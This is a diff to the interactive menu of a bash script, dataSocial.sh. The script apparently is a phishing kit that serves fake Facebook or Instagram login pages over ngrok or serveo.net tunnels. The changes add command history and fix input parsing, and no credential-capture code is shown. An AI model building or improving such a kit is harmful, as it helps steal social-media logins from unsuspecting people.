@@ -179,11 +179,14 @@ showLinkNgrok() {
 }
 
 showLinkSSH() {
-    if [ "$(ps -e | grep -Eo ssh)" ] ; then
+    ssh="$(ps -e | grep -Eo ssh)"
+
+    if [ -n "$ssh" ] ; then
 	echo -e "\e[0m[!] SSH serveo: \e[33;1mserveo.net:$port\e[0m"
 
     else
 	echo -e "\e[0m[!] SSH serveo error\e[0m"
+	
     fi
 }
 
@@ -361,7 +364,7 @@ rerun() {
 	interrupt > /dev/null && ./dataSocial.sh $args
 
     elif [ -n "$REPLY" -a "$REPLY" == "n" -o "$REPLY" == "N" ] ; then
-	interruptTwo
+	interrupt
 
     else
 	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mInvalid answer, try '\e[33;1my\e[31;1m' or '\e[33;1mn\e[31;1m'\e[0m\n"
@@ -380,6 +383,9 @@ options_i() {
 
 menu() {
 
+    count=0
+    commands=()
+
     scape=$(printf '\u1b')
     cmd="\e[0m\e[31;1mDs\e[36;3m>\e[0m\e[34m"
 
@@ -394,54 +400,63 @@ menu() {
 
 	    case $mode in
 		"[A")
-		    if [[ -n $previousComm ]] ; then
-			comm=$previousComm
+		    if [[ ${#commands[*]} -ge 1 ]] ; then
+	
+			index=$[ $count -1 ]
+			comm=${commands[$index]}
 		    fi
 		    ;;
-
 		"[B")
-		    currentComm=$comm
-		    unset comm
-		    echo -ne "\r$cmd                 "
+			unset comm
+			printf "\r                                                 "
 		    ;;
 		*)
             esac
 
 	elif [[ $mode == $'\x7f' ]] ; then
 	    if [[ -n $comm ]] ; then
-		previousComm=${comm%?}
-		comm=$previousComm
+
+		comm=${comm%?}
 		printf "\b \b"
+		
 	    fi
      
         elif [[ $mode == $'\0A' ]] ; then
 	    if [[ -n "$comm" ]] ; then
-		previousComm=$comm
 
 		# quit, exit
 		if [[ "$comm" == "quit" ]] || 
 		   [[ "$comm" == "QUIT" ]] || 
 		   [[ "$comm" == "exit" ]] || 
 		   [[ "$comm" == "EXIT" ]] ; then
+		
 		    interrupt && exit 0
 
 		# help, ?
 		elif [[ "$comm" == "help" ]] || 
 		     [[ "$comm" == "HELP" ]] || 
 		     [[ "$comm" == "?" ]] ; then
+	      	    commands[$count]=$comm
 		    usage_i
 
 		# show
 		elif [[ "${comm:0:4}" == "show" ]] ; then
+		    commands[$count]=$comm
 		    if [[ -n "${comm:5}" ]] ; then
 
-			if [[ "${comm:5}" == "services" ]] ; then
+			if [[ "${comm:5:8}" == "services" ]] ; then
+			    commands[$count]=$comm
+		
       	    	            list "${services[*]}"
 
-			elif [[ "${comm:5}" == "tunnels" ]] ; then
+			elif [[ "${comm:5:7}" == "tunnels" ]] ; then
+			    commands[$count]=$comm
+
 			    list "${tunnels[*]}"
 
-			elif [[ "${comm:5}" == "options" ]] ; then
+			elif [[ "${comm:5:7}" == "options" ]] ; then
+			    commands[$count]=$comm
+
 			    options_i
 
 			else
@@ -458,17 +473,25 @@ menu() {
 		# use
 		elif [[ "${comm:0:3}" == "use" ]] ; then
 
+		    commands[$count]=$comm
+
 		    if [[ -n "${comm:4}" ]] ; then
 
 		        if [[ "${comm:4:7}" == "service" ]] ; then
+			    commands[$count]=$comm
+
 			    if [[ -n "${comm:12}" ]] ; then
 				 
 				case "${comm:12}" in
 				    "facebook")
+
+					commands[$count]=$comm
 					service="${comm:12}"
 					echo -e "\n\e[0m\e[31;1mService => $service\e[0m";;
 
 				    "instagram")
+
+					commands[$count]=$comm
 					service="${comm:12}"
 					echo -e "\n\e[0m\e[31;1mService => $service\e[0m";;
 
@@ -493,12 +516,18 @@ menu() {
 
 		# set
 		elif [[ "${comm:0:3}" == "set" ]] ; then
+
+		    commands[$count]=$comm
+
 		    if [[ "${comm:4:6}" == "tunnel" ]] ; then
 			
 			if [[ -n "${comm:11}" ]] ; then
 
 			    case "${comm:11}" in
 				"ngrok")
+
+				    commands[$count]=$comm
+
 				    if [[ -n "$service" ]] ; then
 			                tunnel=${comm:11}
 				        echo -e "\n\e[0m\e[31;1mTunnel => $tunnel\e[0m"
@@ -508,6 +537,9 @@ menu() {
 				    ;;
 
 				"ssh")
+
+				    commands[$count]=$comm
+
 				    if [[ -n "$service" ]] ; then
 				        tunnel=${comm:11}
 				        echo -e "\n\e[0m\e[31;1mTunnel => $tunnel\e[0m"
@@ -535,6 +567,8 @@ menu() {
 		elif [[ "${comm:0:3}" == "run" ]] || 
 		     [[ "${comm:0:7}" == "execute" ]] || 
 		     [[ "${comm:0:7}" == "exploit" ]] ; then
+		    commands[$count]=$comm
+
 		    if [[ -n "$service" ]] && 
 		       [[ -z "$tunnel" ]] then
 			echo -e "\n\e[0mRunning the setup locally\e[0m..."
@@ -557,6 +591,7 @@ menu() {
 		fi
 
 		unset comm
+		count=$[ $count +1 ]
 
 	    else
 		echo -e "\n\e[0m\e[33;1mError, try? or help for more help!\e[0m"
